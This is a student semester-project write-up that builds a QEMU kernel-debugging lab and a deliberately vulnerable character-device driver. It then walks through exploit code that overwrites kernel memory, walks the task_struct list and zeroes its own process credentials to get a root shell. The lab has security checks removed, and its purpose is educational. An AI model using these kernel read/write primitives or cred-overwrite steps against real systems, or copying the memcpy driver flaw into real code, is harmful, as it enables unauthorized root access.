# Semester project 2021 - László Szapula

## Table of contents

* [Creating the enviornment and the first kernel module](#creating-the-enviornment-and-the-first-kernel-module)  
	 * [Installing qemu](#installing-qemu)  
	 * [Building linux kernel](#building-linux-kernel)  
	 * [Compiling buildroot](#compiling-buildroot)  
	 * [Boot script and testing](#boot-script-and-testing)  
	 * [GDB](#gdb)  
* [Device driver module and the first exploit](#device-driver-module-and-the-first-exploit)  
	 * [Device file](#device-file)  
	 * [The first exploit](#the-first-exploit)   
* [Privilege escalation with driver files](#privilege-escalation-with-driver-files)   
	 * [Cleaning up previous exploit ](#cleaning-up-previous-exploit)  
	 * [Getting root shell](#getting-root-shell)  

## Creating the enviornment and the first kernel module

### Installing qemu
sudo apt install qemu qemu-system-x86

```mkdir ~/kernel_debug  ```
// download linux source tar, extract it and rename linux-<version> to linux  
// download buildroot source archive, extract it and rename buildroot-<version> to buildroot
 

From here basically following the steps in the following website:  
https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/

### Building linux kernel
Configured everything just like on the website, but didnt apply KASan debugger and didn't disable any security features (will disable kaslr in qemu).

### Compiling buildroot
Same as above, selected ext2 fs, made init script and added root and 'user' users by creating shadow and passwd files (passwords are root and user).
Set user home permission in device table:  
```echo -e '/home/user\td\t755\t1000\t100\t-\t-\t-\t-\t-' >> <kernel_debug directory>/buildroot/system/device_table.txt```  
Added kernel modules:  
(in linux folder) ```make modules_install INSTALL_MOD_PATH=<kernel_debug directory>/buildroot/overlay```  
And finally make source & make

### Boot script and testing
Wrote boot.sh and started it. Then added ssh keys with ssh-copy-id, to be able to copy files (mainly kernel modules) with scp.
Then I wrote hello.c in linux/src/hello, compiled with Makefile and copied hello.ko to the qemu machine with scp.

### GDB
First added python script to gdbinit:  
```echo "add-auto-load-safe-path `pwd`/scripts/gdb/vmlinux-gdb.py" >> ~/.gdbinit```  

Then started it:  
```gdb vmlinux```  
```gdb> target remote :1234```  

Here I installed hello.ko (insmod) and copied the address of the module:  
```cat /proc/modules | grep hello```  

```gdb> add-symbols-file src/hello/hello.ko <address copied>```   

```gdb> b *<address copied>```  
  
Then I removed hello module (rmmod) and restarted it. Now I got a breakpoint in the init_module function.

## Device driver module and the first exploit

### Device file  
I updated the original hello.c to be able to read and write data to a device file and store its content in a static buffer.  
It can be found in the folder modules/hello2, and there is another folder, which contains a user space program, that writes to this device file and reads from it.  

First I need to load the kernel module:  
```insmod hello2.ko```  

Then I need the major version of the registered character device, which I can find in dmesg:  
```
dmesg | tail   
...
[ 8253.792398] hello2 module loaded with device major number 248
```  

With this number I'm able to create a character device file for this module:  
```mknod /dev/hello2 c 248 0``` 

Now I can test the userspace program, which I compiled on the host machine and scp-d to the qemu instance:  
```
./up-test
[+] Opening device file for writing...
String to send to module:
Hello, I'm LaTsa
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
[+] The message is: Hello, I'm LaTsa
```  

Now I can remove the device file and stop the kernel module:  
```
rm -f /dev/hello2 
rmmod hello2.ko 
[ 8752.559090] Goodbye then
```

### The first exploit  
Now that we can create a character device driver, and we can read from it and write to it, it's time to do some magic with it. In the original hello2 module we user `copy_from_user` and `copy_to_user` functions, that copies data from user space memory to kernel space memory and vice versa. What if the kernel module didn't use those functions? Let's try it by replacing them with `memcpy` (as seen in the hello2_vuln module).  
To exploit this weakness, lets write a simple c program (`hello2_vuln/exploit/exploit.c`). It's basically the same as the previous up_test program, but we make a simple change: we will not use a buffer in our code to receive what we read from the device file. We set the `receive` variable to hold the address of a special structure in the kernel.  
For example we want to change the structure, that is used by the `uname` program. This structure is in `/init/version.c` file and it's name is `init_uts_ns`. `uname` uses this structure to print us the information about the system. To get the address of this data, we can use `/proc/kallsyms`:  
```
cat /proc/kallsyms | grep init_uts_ns
...
ffffffff8301a620 D init_uts_ns
```  
We basically just need to load this address in the receive variable in exploit.c, and see the magic happen. After loading the module and generating it's device file, we can try the exploit:  
```
./exploit
[+] Opening device file for writing...
String to send to module:
HELLO
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
[-] Failed to read message from the device file
```
Ok, something went wrong. If we include the `errno.h` header and use the `perror(const char*)` function, we can get what the problem is:  
```
Error: Bad address
```

That's not good. If we try to debug the issue, and put a breakpoint in the `device_read` function, we wont stop in that function. It's because we don't even get there. Which means we fail already ad the `read` function in the exploit. Check out the source code of the write syscall.  
We can find this in `fs/read_write.c`, and the function looks like this:  
```C
SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)
{
	return ksys_read(fd, buf, count);
}
```
So it's basically just calling  the `ksys_read` function. Let's check it out. We can see, that amongst others this function is calling `vfs_read`:  
```C
ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)
{
	struct fd f = fdget_pos(fd);
	ssize_t ret = -EBADF;

	if (f.file) {
		...
		ret = vfs_read(f.file, buf, count, ppos);
		...
	}
	return ret;
}
```
Vfs_read does again many things, but we see the interesting thing in the first few lines:  
```C
ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
	ssize_t ret;

	if (!(file->f_mode & FMODE_READ))
		return -EBADF;
	if (!(file->f_mode & FMODE_CAN_READ))
		return -EINVAL;
	if (unlikely(!access_ok(buf, count)))
	 return -EFAULT;
 ...
 ...
 ...
 }
 ```
As we can see, it's returning -EFAULT (which makes errno write Bad address) based on the value of `access_ok`. This macro can be found in `include/asm-generic/uaccess.h`. It checks, if the function sends an address from its memory space. That's what stops us at our exploit. To get around it, we can comment out the if statement in vfs_read (and in vfs_write too), recompile the kernel, and retry the exploit.  
```C
//if (unlikely(!access_ok(buf, count)))
// return -EFAULT;
```
Now if we try the exploit:  
```
 ./exploit
[+] Opening device file for writing...
String to send to module:
HELLO
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
```  
There is no error. Now if we try `uname -a`:
```
uname -a
HELLO latsa 5.11.0 #2 SMP Thu Feb 25 14:33:41 CET 2021 x86_64 GNU/Linux
```
It's working!

## Privilege escalation with driver files  

### Cleaning up previous exploit  
To be able to use our exploit for more than abusing uname, we need to clean the code a little bit. I basically wrote two functions: `read_kernel` and `write_kernel`.  
```C
void read_kernel(void *address, const char* buffer, ssize_t size){
        check_fd();
        write_device(FD, address, size);
        read_device(FD, buffer, BUFFER_LEN);
}
```  
```C
void write_kernel(void *address, const char* str_to_send, ssize_t size){
        check_fd();
        write_device(FD, str_to_send, size);
        read_device(FD, address, size);
}
```  
In`read_kernel` we make the driver write from the given address to its buffer, and we read it into our buffer. In `write_kernel` we write something into its buffer and then read it to the desired memory address. With this the previous exploit runs even better.  
```
# ./privesc 
[+] Opening device file...
[+] Reading from target...
[+] Kernel address successfully read
Linux
[+] Writing to target...
[+] Successfully written to target! Check with uname -a
# uname -a
HELLO latsa_kernel 5.11.0 #2 SMP Wed Mar 3 11:40:39 CET 2021 x86_64 GNU/Linux
```  

### Getting root shell  

In order to get root shell, we need to set the credential of our process to root privileges. This can be done by rewriting the creds field of the task_struct of this process. So first we need to find it.  
We can do it by traversing the linked list of task_struct heads, starting from `init_task`. But of course, these structs are hidden in the kernel address space of the memory, so no user-space program can read them. That's where te kernel driver comes in.  
To get started, we need to get the address of the `init_taks`. It can be found with this command:  
```
# cat /proc/kallsyms | grep init_task
...
ffffffff82614940 D init_task
...
```  
We can use this address as a macro in our C code:  
`#define INIT_TASK 0xffffffff82614940`  
Next, we need to find offsets in the `task_struct`. We can do this by hand, or with the hand of GDB.  
```
(gdb) print (int)&((struct task_struct*)0)->tasks
$1 = 1000
(gdb) print (int)&((struct task_struct*)0)->pid
$2 = 1256
(gdb) print (int)&((struct task_struct*)0)->cred
$3 = 1696
```  
We need the offset of `tasks`, because by traversing the list of tasks we always get to this offset of the `task_struct`. So, if we need the PID of the task, we need to calculate it like this: `pointer_from_list - offset_of_task + offset_of_pid`. But I later used a more convenient way by calculating the difference between the two offsets. I used the as macros as well:  
```C
#define OFFSET_TO_HEAD 0x3e8
#define OFFSET_TO_PID 0x4e8
#define HEAD_TO_PID 0x100
#define OFFSET_TO_CRED 0x6a0
#define HEAD_TO_CRED 0x2b8
#define BUFFER_LEN 256
```  
With these offsets I could finally start writing the real exploit. First I read the `tasks` field of the `init_task` struct by adding the `tasks` offset to the previously gotten pointer:  
```C
void *target = INIT_TASK + OFFSET_TO_HEAD;
char *buf;
 
read_kernel(target, &buf, sizeof(char*));
```  

I defined pointer `buf` is used to read the content of target into. It is a char pointer, because it won't mess with pointer arithmetic. If we add 1 to it, it will only jump one byte forwards, not 4 like with an int pointer. So I read the `tasks` field from the `init_task`. Now, to identify our process, we need to get the PID of our process:  
```C
int pid = getpid();
```  
Then we need to search for this during traversing the list. So lets read the PID field of the task_struct, which is now in buf:  
```C
int pid_of_task = 0;
read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
``` 
Now we have all what we need to traverse the task list. This is done in a while loop:  
```C
while(pid_of_task != pid){
    read_kernel(buf, &buf, sizeof(char*));
    read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
    printf("\t[+] PID of task: %d\n", pid_of_task);
}
```  
So in this loop I set buf to the address contained by itself, so getting the next element of the list. Then it reads the pid into `pid_of_task`. This is done, while the read PID is not our PID.  
When this is done, we need to find the `cred` field in this struct:  
```C
char *addr_to_task = buf - OFFSET_TO_HEAD;
printf("[+] Address to our task: %p\n", addr_to_task);
 
char *addr_to_cred;
read_kernel(buf + HEAD_TO_CRED, &addr_to_cred, sizeof(char*));
printf("[+] Address to cred: %p\n", addr_to_cred);
```  
So we basically calculate the address of the `cred` field, and then read the address of the cred struct from here. After this we can rewrite the uid of this cred struct to 0, thus giving it root privileges:  
```C
long long n = 0;
write_kernel(addr_to_cred, &n, sizeof(long long));
```
No we have root privileges. Now we can simply start a root shell:  
```C
system("/bin/sh");
```  

And this is it! This is how it looks in action:  

```
# id
uid=1000(user) gid=1000 groups=1000
# ./privesc 
[+] PID = 183
[+] Reading head from init_tast...
[+] Kernel read
[+] Searching for the PID of this program...
        [+] PID of task: 2
        [+] PID of task: 3
        ...
        [+] PID of task: 183
[+] Address to our task: 0xffff888004471a80
[+] Address to cred: 0xffff8880044b7300
[+] Now setting our cred to 0...
[+] Root shell gained!
# id
uid=0(root) gid=1000 groups=1000
#
```

